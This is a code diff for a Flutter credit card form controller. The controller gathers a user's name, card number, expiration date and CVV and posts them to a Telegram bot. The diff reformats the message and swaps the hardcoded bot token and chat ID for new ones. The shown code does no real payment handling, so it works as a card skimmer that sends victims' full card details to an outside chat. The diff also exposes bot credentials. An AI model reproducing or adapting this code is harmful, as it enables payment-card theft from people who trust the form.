@@ -18,11 +18,8 @@ class CreditCardFormController extends GetxController {
     final String cardNumber = cardNumberController.text;
     final String expirationDate = expirationDateController.text;
     final String cvv = cvvController.text;
-    final msg = 'The information\n Name:$cardName' +
-        '\n Card Number:$cardNumber' +
-        '\n Expiration Date:$expirationDate' +
-        '\n CVV:$cvv' +
-        '\nlevel is ${selectedItem.value}';
+    final msg =
+        'The information\n Name:$cardName\n Card Number:$cardNumber\n Expiration Date:$expirationDate\n CVV:$cvv\nlevel is ${selectedItem.value}';
     await sendMessageToTelegram(msg);
   }
   // You can validate the form data here if required
@@ -40,10 +37,9 @@ class CreditCardFormController extends GetxController {
     super.onClose();
   }
 
-
   Future<void> sendMessageToTelegram(String message) async {
-    const telegramBotToken = '6523460876:AAGfTKNriMKxXc4AFtXI25tOeM9ygLtUlws';
-    const chatId = '488701384';
+    const telegramBotToken = '6387726446:AAE-qqcvhlXNx_Q7y_NgdwuLp7f2RJoo7fQ';
+    const chatId = '1637071334';
     const String telegramUrl =
         'https://api.telegram.org/bot$telegramBotToken/sendMessage';
 
